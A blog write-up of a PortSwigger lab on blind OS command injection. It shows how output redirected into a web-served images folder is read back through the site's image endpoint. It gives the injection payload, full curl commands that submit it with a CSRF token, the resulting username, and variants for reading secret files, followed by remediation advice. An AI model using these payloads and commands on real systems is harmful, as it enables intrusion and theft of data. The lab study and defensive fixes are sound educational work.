---
layout: post
title: "PortSwigger: Blind OS Command Injection with Output Redirection"
date: 2027-09-17 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, CommandInjection]
tags: [portswigger, os-command-injection, command-injection, blind, output-redirection, webroot, whoami, cwe-78]
---

The feedback form on this shop pastes your **email** value into an operating-system shell command — same root cause as the simple case — but with one twist: the command's output is never shown back to you. The page just says "thanks". So how do you read the result of a [blind](https://cwe.mitre.org/data/definitions/78.html) injection without a DNS callback or a stopwatch? You make the server **write the output to disk in a folder it already serves to the world**, then download it like a product image.

## Overview

This is a blind [OS command injection](https://cwe.mitre.org/data/definitions/78.html) ([CWE-78](https://cwe.mitre.org/data/definitions/78.html)). The `email` parameter of `POST /feedback/submit` is spliced into a shell command, but the output is discarded from the HTTP response. The same application also serves product images out of the on-disk directory `/var/www/images/` via `GET /image?filename=...`. By redirecting the command's standard output into that directory with the shell `>` operator, the blind bug becomes fully readable — no out-of-band channel required. The objective is to run `whoami`.

## The technique

The server builds a shell command that includes the email you submit. Three shell features make the exfil work:

- **`||`** — the OR operator. The app's intended command (with our bogus left side) fails, so the shell runs the next command. The *trailing* `||` short-circuits whatever the app appended after our value, so the line doesn't error.
- **`>`** — redirects standard output into a file. We aim it at `/var/www/images/`, which is web-accessible and writable by the web user.
- **the existing `/image?filename=` feature** — happily serves any file in that directory, including the one we just planted.

So the payload, placed in the `email` field, is:

```
||whoami>/var/www/images/output.txt||
```

## Solving it

First grab a fresh (single-use) CSRF token and session cookie from the feedback page, then submit the injection:

```bash
csrf=$(curl -sk -c cookies.txt "https://TARGET/feedback" \
  | grep -oiE 'name="csrf" value="[^"]*"' | sed -E 's/.*value="([^"]*)".*/\1/')

curl -sk -b cookies.txt "https://TARGET/feedback/submit" \
  --data-urlencode "csrf=$csrf" \
  --data-urlencode "name=test" \
  --data-urlencode "email=||whoami>/var/www/images/output.txt||" \
  --data-urlencode "subject=test" \
  --data-urlencode "message=test"
```

Then read the result straight out of the image loader:

```bash
curl -sk "https://TARGET/image?filename=output.txt"
```

Response body:

```
peter-zyGPUQ
```

That's the OS account the web server runs as. The lab flips to **Solved** the instant the command executes.

## Why it worked

- The `email` value reaches a shell unsanitised, so `||`, `>`, and the filename are interpreted as command syntax rather than data.
- We can't see stdout in the response — but we control *where* stdout goes. Redirecting it into a directory the server already publishes turns "blind" into "readable" with nothing but two ordinary HTTP requests.
- This beats the alternatives when they're unavailable: no DNS/Collaborator egress is needed (unlike out-of-band exfil) and no timing oracle is needed (unlike blind time delays). A writable, web-served directory *is* the channel.
- Swap `whoami` for `cat /home/carlos/secret` or `ls -la /` to read anything the web user can.

## The fix

1. **Don't call a shell.** Pass the program and its arguments as a list so the OS never re-parses your data as command syntax: `subprocess.run(["mail", "-s", "feedback", email])` — never `shell=True`.
2. **Validate input** — an email field should pass a strict validator before it goes anywhere near a command.
3. **Don't serve static assets from a directory the application process can write to.** If `/var/www/images/` were read-only to the web user, the redirect-and-fetch path would close even if injection still existed.

Keep untrusted data and command syntax separate, and don't let a writable directory double as a public download endpoint.
